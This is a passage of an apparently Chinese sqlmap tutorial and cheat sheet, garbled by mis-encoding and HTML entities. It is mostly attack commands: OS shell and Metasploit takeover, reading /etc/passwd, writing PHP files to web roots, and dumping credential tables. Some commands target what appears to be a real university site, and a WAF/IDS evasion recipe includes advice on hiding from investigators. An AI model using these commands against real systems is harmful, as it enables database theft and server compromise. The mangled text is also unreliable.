test.php?p&#x3D;2 -b â€“os-pwn â€“msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 112..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“os-bof â€“msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3 -v 113..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“reg-add â€“reg-key&#x3D;â€HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmapâ€ â€“reg-value&#x3D;Test â€“reg-type&#x3D;REG_SZ â€“reg-data&#x3D;114..&#x2F;sqlmap.py -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -b â€“eta15..&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;get_str_brackets.php?id&#x3D;1â€³ -p id â€“prefix â€œâ€˜)â€ â€“suffix â€œAND (â€˜abcâ€™&#x3D;&#39;abcâ€16..&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;basic&#x2F;get_int.php?id&#x3D;1â€³ â€“auth-type Basic â€“auth-cred â€œtestuser:testpassâ€17..&#x2F;sqlmap.py -l burp.log â€“scope&#x3D;â€(www)?\\.target\\.(com|net|org)â€18..&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mysql&#x2F;get_int.php?id&#x3D;1â€³ â€“tamper tamper&#x2F;between.py,tamper&#x2F;randomcase.py,tamper&#x2F;space2comment.py -v 319..&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;www.evil0x.com&#x2F; sqlmap&#x2F;mssql&#x2F;get_int.php?id&#x3D;1â€³ â€“sql-query â€œSELECT â€˜fooâ€™â€ -v 120..&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;www.evil0x.com&#x2F; mysql&#x2F;get_int_4.php?id&#x3D;1â€³ â€“common-tables -D testdb â€“banner ç®€å•çš„æ³¨å…¥æµç¨‹ 123456789101112131415161718192021222324252627282930313233341.è¯»å–æ•°æ®åº“ç‰ˆæœ¬ï¼Œå½“å‰ç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 -f -b â€“current-user â€“current-db -v 12.åˆ¤æ–­å½“å‰æ•°æ®åº“ç”¨æˆ·æƒé™sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“privileges -U ç”¨æˆ·å -v 1sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“is-dba -U ç”¨æˆ·å -v 13.è¯»å–æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·æˆ–æŒ‡å®šæ•°æ®åº“ç”¨æˆ·çš„å¯†ç sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“users â€“passwords -v 2sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“passwords -U root -v 24.è·å–æ‰€æœ‰æ•°æ®åº“sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“dbs -v 25.è·å–æŒ‡å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“tables -D mysql -v 26.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨çš„å­—æ®µsqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“columns -D mysql -T users -v 27.è·å–æŒ‡å®šæ•°æ®åº“åä¸­æŒ‡å®šè¡¨ä¸­æŒ‡å®šå­—æ®µçš„æ•°æ®sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“dump -D mysql -T users -C â€œusername,passwordâ€ -s â€œsqlnmapdb.logâ€ -v 28.file-readè¯»å–webæ–‡ä»¶sqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“file-read â€œ&#x2F;etc&#x2F;passwdâ€ -v 29.file-writeå†™å…¥æ–‡ä»¶åˆ°websqlmap -u http:&#x2F;&#x2F;www.evil0x.com&#x2F; test.php?p&#x3D;2 â€“file-write &#x2F;localhost&#x2F;mm.php â€“file-dest.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.nxadmin.com&#x2F;sql-injection.php?id&#x3D;1&quot; â€“file-write &#x2F;test&#x2F;test.txt â€“file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txtå°†æœ¬åœ°çš„test.txtå†™å…¥åˆ°ç«™ç‚¹æœåŠ¡å™¨çš„htmlç›®å½•ä¸‹ã€‚ python sqlmap/sqlmap.py -help 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337Optionsï¼ˆé€‰é¡¹ï¼‰ï¼š--version æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·å¹¶é€€å‡º-h, --help æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º-v VERBOSE è¯¦ç»†çº§åˆ«ï¼š0-6ï¼ˆé»˜è®¤ä¸º1ï¼‰Targetï¼ˆç›®æ ‡ï¼‰ï¼šä»¥ä¸‹è‡³å°‘éœ€è¦è®¾ç½®å…¶ä¸­ä¸€ä¸ªé€‰é¡¹ï¼Œè®¾ç½®ç›®æ ‡URLã€‚-d DIRECT ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚-u URL, --url&#x3D;URL ç›®æ ‡URLã€‚-l LIST ä»Burpæˆ–WebScarabä»£ç†çš„æ—¥å¿—ä¸­è§£æç›®æ ‡ã€‚-r REQUESTFILE ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è½½å…¥HTTPè¯·æ±‚ã€‚-g GOOGLEDORK å¤„ç†Google dorkçš„ç»“æœä½œä¸ºç›®æ ‡URLã€‚-c CONFIGFILE ä»INIé…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚Requestï¼ˆè¯·æ±‚ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URLã€‚--data&#x3D;DATA é€šè¿‡POSTå‘é€çš„æ•°æ®å­—ç¬¦ä¸²--cookie&#x3D;COOKIE HTTP Cookieå¤´--cookie-urlencode URL ç¼–ç ç”Ÿæˆçš„cookieæ³¨å…¥--drop-set-cookie å¿½ç•¥å“åº”çš„Set - Cookieå¤´ä¿¡æ¯--user-agent&#x3D;AGENT æŒ‡å®š HTTP User - Agentå¤´--random-agent ä½¿ç”¨éšæœºé€‰å®šçš„HTTP User - Agentå¤´--referer&#x3D;REFERER æŒ‡å®š HTTP Refererå¤´--headers&#x3D;HEADERS æ¢è¡Œåˆ†å¼€ï¼ŒåŠ å…¥å…¶ä»–çš„HTTPå¤´--auth-type&#x3D;ATYPE HTTPèº«ä»½éªŒè¯ç±»å‹ï¼ˆåŸºæœ¬ï¼Œæ‘˜è¦æˆ–NTLMï¼‰(Basic, Digest or NTLM)--auth-cred&#x3D;ACRED HTTPèº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·å:å¯†ç ï¼‰--auth-cert&#x3D;ACERT HTTPè®¤è¯è¯ä¹¦ï¼ˆkey_fileï¼Œcert_fileï¼‰--proxy&#x3D;PROXY ä½¿ç”¨HTTPä»£ç†è¿æ¥åˆ°ç›®æ ‡URL--proxy-cred&#x3D;PCRED HTTPä»£ç†èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰--ignore-proxy å¿½ç•¥ç³»ç»Ÿé»˜è®¤çš„HTTPä»£ç†--delay&#x3D;DELAY åœ¨æ¯ä¸ªHTTPè¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ä¸ºç§’--timeout&#x3D;TIMEOUT ç­‰å¾…è¿æ¥è¶…æ—¶çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º30ç§’ï¼‰--retries&#x3D;RETRIES è¿æ¥è¶…æ—¶åé‡æ–°è¿æ¥çš„æ—¶é—´ï¼ˆé»˜è®¤3ï¼‰--scope&#x3D;SCOPE ä»æ‰€æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤å™¨ç›®æ ‡çš„æ­£åˆ™è¡¨è¾¾å¼--safe-url&#x3D;SAFURL åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸è®¿é—®çš„urlåœ°å€--safe-freq&#x3D;SAFREQ ä¸¤æ¬¡è®¿é—®ä¹‹é—´æµ‹è¯•è¯·æ±‚ï¼Œç»™å‡ºå®‰å…¨çš„URLOptimizationï¼ˆä¼˜åŒ–ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ–SqlMapçš„æ€§èƒ½ã€‚-o å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³--predict-output é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º--keep-alive ä½¿ç”¨æŒä¹…çš„HTTPï¼ˆSï¼‰è¿æ¥--null-connection ä»æ²¡æœ‰å®é™…çš„HTTPå“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦--threads&#x3D;THREADS æœ€å¤§çš„HTTPï¼ˆSï¼‰è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º1ï¼‰Injectionï¼ˆæ³¨å…¥ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œ æä¾›è‡ªå®šä¹‰çš„æ³¨å…¥payloadså’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚-p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°ï¼ˆSï¼‰--dbms&#x3D;DBMS å¼ºåˆ¶åç«¯çš„DBMSä¸ºæ­¤å€¼--os&#x3D;OS å¼ºåˆ¶åç«¯çš„DBMSæ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼--prefix&#x3D;PREFIX æ³¨å…¥payloadå­—ç¬¦ä¸²å‰ç¼€--suffix&#x3D;SUFFIX æ³¨å…¥payloadå­—ç¬¦ä¸²åç¼€--tamper&#x3D;TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ç¯¡æ”¹æ³¨å…¥æ•°æ®Detectionï¼ˆæ£€æµ‹ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨SQLç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒHTTPå“åº”é¡µé¢çš„å†…å®¹ã€‚--level&#x3D;LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰--risk&#x3D;RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰--string&#x3D;STRING æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²--regexp&#x3D;REGEXP æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼--text-only ä»…åŸºäºåœ¨æ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µTechniquesï¼ˆæŠ€å·§ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„SQLæ³¨å…¥æµ‹è¯•ã€‚--technique&#x3D;TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤BEUSTï¼‰--time-sec&#x3D;TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰--union-cols&#x3D;UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯•UNIONæŸ¥è¯¢æ³¨å…¥--union-char&#x3D;UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦Fingerprintï¼ˆæŒ‡çº¹ï¼‰ï¼š-f, --fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹Enumerationï¼ˆæšä¸¾ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œæ‚¨è‡ªå·±çš„SQLè¯­å¥ã€‚-b, --banner æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†--current-user æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·--current-db æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“--is-dba æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBA--users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·--passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ--privileges æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™--roles æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²--dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“--tables æšä¸¾çš„DBMSæ•°æ®åº“ä¸­çš„è¡¨--columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ—--dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹--dump-all è½¬å‚¨æ‰€æœ‰çš„DBMSæ•°æ®åº“è¡¨ä¸­çš„æ¡ç›®--search æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ&#x2F;æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰-D DB è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“å-T TBL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“è¡¨-C COL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—-U USER ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·--exclude-sysdbs æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“--start&#x3D;LIMITSTART ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢--stop&#x3D;LIMITSTOP æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢--first&#x3D;FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢--last&#x3D;LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢--sql-query&#x3D;QUERY è¦æ‰§è¡Œçš„SQLè¯­å¥--sql-shell æç¤ºäº¤äº’å¼SQLçš„shellBrute forceï¼ˆè›®åŠ›ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚--common-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨--common-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚--udf-inject æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°--shared-lib&#x3D;SHLIB å…±äº«åº“çš„æœ¬åœ°è·¯å¾„File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚--file-read&#x3D;RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶--file-write&#x3D;WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶--file-dest&#x3D;DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨äºè®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ“ä½œç³»ç»Ÿã€‚--os-cmd&#x3D;OSCMD æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤--os-shell äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„shell--os-pwn è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC--os-smbrelay ä¸€é”®è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC--os-bof å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨--priv-esc æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡--msf-path&#x3D;MSFPATH Metasploit Frameworkæœ¬åœ°çš„å®‰è£…è·¯å¾„--tmp-path&#x3D;TMPPATH è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„Windowsæ³¨å†Œè¡¨è®¿é—®ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»ŸWindowsæ³¨å†Œè¡¨ã€‚--reg-read è¯»ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼--reg-add å†™ä¸€ä¸ªWindowsæ³¨å†Œè¡¨é¡¹å€¼æ•°æ®--reg-del åˆ é™¤Windowsæ³¨å†Œè¡¨é”®å€¼--reg-key&#x3D;REGKEY Windowsæ³¨å†Œè¡¨é”®--reg-value&#x3D;REGVAL Windowsæ³¨å†Œè¡¨é¡¹å€¼--reg-data&#x3D;REGDATA Windowsæ³¨å†Œè¡¨é”®å€¼æ•°æ®--reg-type&#x3D;REGTYPE Windowsæ³¨å†Œè¡¨é¡¹å€¼ç±»å‹Generalï¼ˆä¸€èˆ¬ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®ä¸€äº›ä¸€èˆ¬çš„å·¥ä½œå‚æ•°ã€‚-t TRAFFICFILE è®°å½•æ‰€æœ‰HTTPæµé‡åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­-s SESSIONFILE ä¿å­˜å’Œæ¢å¤æ£€ç´¢ä¼šè¯æ–‡ä»¶çš„æ‰€æœ‰æ•°æ®--flush-session åˆ·æ–°å½“å‰ç›®æ ‡çš„ä¼šè¯æ–‡ä»¶--fresh-queries å¿½ç•¥åœ¨ä¼šè¯æ–‡ä»¶ä¸­å­˜å‚¨çš„æŸ¥è¯¢ç»“æœ--eta æ˜¾ç¤ºæ¯ä¸ªè¾“å‡ºçš„é¢„è®¡åˆ°è¾¾æ—¶é—´--update æ›´æ–°SqlMap--save fileä¿å­˜é€‰é¡¹åˆ°INIé…ç½®æ–‡ä»¶--batch ä»ä¸è¯¢é—®ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨æ‰€æœ‰é»˜è®¤é…ç½®ã€‚Miscellaneousï¼ˆæ‚é¡¹ï¼‰ï¼š--beep å‘ç°SQLæ³¨å…¥æ—¶æé†’--check-payload IDSå¯¹æ³¨å…¥payloadsçš„æ£€æµ‹æµ‹è¯•--cleanup SqlMapå…·ä½“çš„UDFå’Œè¡¨æ¸…ç†DBMS--forms å¯¹ç›®æ ‡URLçš„è§£æå’Œæµ‹è¯•å½¢å¼--gpage&#x3D;GOOGLEPAGE ä»æŒ‡å®šçš„é¡µç ä½¿ç”¨è°·æ­Œdorkç»“æœ--page-rank Google dorkç»“æœæ˜¾ç¤ºç½‘é¡µæ’åï¼ˆPRï¼‰--parse-errors ä»å“åº”é¡µé¢è§£ææ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„é”™è¯¯æ¶ˆæ¯--replicate å¤åˆ¶è½¬å‚¨çš„æ•°æ®åˆ°ä¸€ä¸ªsqlite3æ•°æ®åº“--tor ä½¿ç”¨é»˜è®¤çš„Torï¼ˆVidalia&#x2F; Privoxy&#x2F; Polipoï¼‰ä»£ç†åœ°å€--wizard ç»™åˆçº§ç”¨æˆ·çš„ç®€å•å‘å¯¼ç•Œé¢ æ³¨å…¥ç‚¹ï¼šhttp://testasp.vulnweb.com/Login.asp 12345å‡ ç§æ³¨å…¥æ–¹å¼ï¼š.&#x2F;sqlmap.py -r search-test.txt -p tfUPasssqlmap -u http:&#x2F;&#x2F;testasp.vulnweb.com&#x2F;Login.asp --formssqlmap.py -u http:&#x2F;&#x2F;testasp.vulnweb.com&#x2F;Login.asp --data &quot;tfUName&#x3D;1&amp;tfUPass&#x3D;1&quot; æ³¨å…¥ç‚¹ï¼šhttp://jxjy.bfa.edu.cn/bm/newslist.php?cid=7 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364è·å–æ‰€æœ‰æ•°æ®åº“åç§°sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --dbsè·å–å½“å‰æ•°æ®åº“åç§°sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --current-dbè·å–å½“å‰ç”¨æˆ·åç§°sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --current-userè·å–å…¨éƒ¨è¡¨æ®µsqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --tables -D æ•°æ®åº“åç§°è·å–å…¨éƒ¨å­—æ®µsqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --columns -T è¡¨æ®µ -D æ•°æ®åº“åç§°è·å–å­—æ®µå†…å®¹sqlmap.py -u http:&#x2F;&#x2F;jxjy.bfa.edu.cn&#x2F;bm&#x2F;newslist.php?cid&#x3D;7 --dump -C username,password -T è¡¨æ®µ -D æ•°æ®åº“åç§°1)åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯dbasqlmap.py -u ç½‘å€ --is-dba -v 12)--users:åˆ—å‡ºæ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·sqlmap.py -u ç½‘å€ --users -v 03)--passwords:æ•°æ®åº“ç”¨æˆ·å¯†ç (hash)sqlmap.py -u ç½‘å€ --passwords -v 0sqlmap.py -u ç½‘å€ --passwords -U sa -v 04)æŸ¥çœ‹ç”¨æˆ·æƒé™sqlmap.py -u ç½‘å€ --privileges -v 0sqlmap.py -u ç½‘å€ --privileges -U postgres -v 05)--dbså¯ä»¥åˆ©ç”¨çš„æ•°æ®åº“sqlmap.py -u ç½‘å€ --dbs -v 06)--tablesåˆ—æ•°æ®åº“è¡¨sqlmap.py -u ç½‘å€ --tables -D &quot;information_scheam&quot;-D:æŒ‡å®šæ•°æ®åç§°7)--columns åˆ—å‡ºè¡¨ä¸­çš„åˆ—åsqlmap.py -u ç½‘å€ --columns -T &quot;user&quot; -D &quot;mysql&quot; -v 1-T:æŒ‡å®šè¡¨åï¼Œ-D:æŒ‡å®šåº“å8)--dumpåˆ—è¡¨ä¸­æŒ‡å®šåˆ—çš„å†…å®¹sqlmap.py -u ç½‘å€ --dump -T &quot;users&quot; -D &quot;testdb&quot;-C:å¯ä»¥æŒ‡å®šå­—æ®µæŒ‡å®šåˆ—çš„èŒƒå›´ä¸º2åˆ°4sqlmap.py -u ç½‘å€ --dump -T &quot;users&quot; -D &quot;testdb&quot; --start 2 --stop 4 -v 09)--dumap-allåˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ï¼Œæ‰€æœ‰è¡¨å†…å®¹sqlmap.py -u ç½‘å€ --dump-all -v 0 sqlmapæ³¨å…¥æŠ€å·§-ç»•è¿‡WAFå’ŒIDS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223åˆšåˆšç¾¤é‡Œæœ‰ä¸ªå“¥ä»¬å‘äº†ä¸ªæ³¨å…¥ç‚¹ï¼Œæœ‰IDSé˜²ç«å¢™ï¼Œè¯·æ±‚è¿‡äºé¢‘ç¹å°±ä¼šå°æ€IPæœ‰ä¸ªæ€è·¯ï¼ŒæŠ›ç –å¼•ç‰ï¼Œå„ä½å¤§ç‰›è¯·è½»æ‹sqlmap.py --proxy http:&#x2F;&#x2F;127.0.0.1:8087 -u ä½ æ‡‚å¾— -v 3 â€“dbms â€œMySQLâ€ --tamper â€œspace2morehash.pyâ€ --refererâ€œhttp:&#x2F;&#x2F;www.google.comâ€ --user-agent &quot;Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.googlebot.com&#x2F;bot.htmlï¼‰&quot;å‚æ•°è§£é‡Š ï¼š--proxy &#x2F;&#x2F;è¿™ä¸ªæ˜¯ä»£ç†çš„IPï¼Œä½ ä¸ç”¨ä»£ç†ä¸ç”¨VPNå°±ä¸æ€•è¢«æŸ¥æ°´è¡¨ä¹ˆã€‚ã€‚ã€‚-u &#x2F;&#x2F;è¿™ä¸ªä¸æ‡‚çš„é¢å£å»-v 3 &#x2F;&#x2F;è¿™ä¸ªæ˜¯æ³¨å…¥çš„è¯¦ç»†çº§åˆ«1-5--dbms &quot;MySQL&quot; &#x2F;&#x2F;æŒ‡å®šæ•°æ®åº“--tamper â€œspace2morehash.pyâ€ &#x2F;&#x2F;è½½å…¥ç»•è¿‡WAFé˜²ç«å¢™çš„è„šæœ¬--refererâ€œhttp:&#x2F;&#x2F;www.google.comâ€ &#x2F;&#x2F;æ¨¡æ‹Ÿæ¥æºï¼Œå°±æ˜¯ä»å“ªä¸ªç½‘é¡µè·³è½¬è¿‡æ¥çš„ã€‚å¦‚æœä¸æ‡‚å¯ä»¥è°·æ­Œreferer--user-agent &quot;Googlebot&#x2F;2.1 (+http:&#x2F;&#x2F;www.googlebot.com&#x2F;bot.htmlï¼‰&quot; æ¨¡æ‹Ÿè°·æ­Œèœ˜è››ï¼Œä¸€èˆ¬éƒ½ä¸ä¼šé™åˆ¶èœ˜è››çˆ¬ç½‘ç«™ã€‚æ›´å¤šå‘½ä»¤è¿ç”¨ï¼šhttp:&#x2F;&#x2F;wenku.baidu.com&#x2F;link?url&#x3D;eMzrblqUDfXDaosGNkAKnthsT4AA79BEgd5XUnD624yqefBbHaqZk-lVx3pns2M6tApuP7bbNYpPTHGBgiCxdutlUKFGtdmJj80usI2nBuSsqlmapæ³¨å…¥æ–¹å¼æ™®åŠ0.è¯¦ç»†å‚æ•°è¯¦è§£ï¼šhttp:&#x2F;&#x2F;pan.baidu.com&#x2F;share&#x2F;link?shareid&#x3D;503193&amp;uk&#x3D;32239797631. åŸºç¡€ç”¨æ³•ï¼š.&#x2F;sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 --dbs &#x2F;&#x2F; 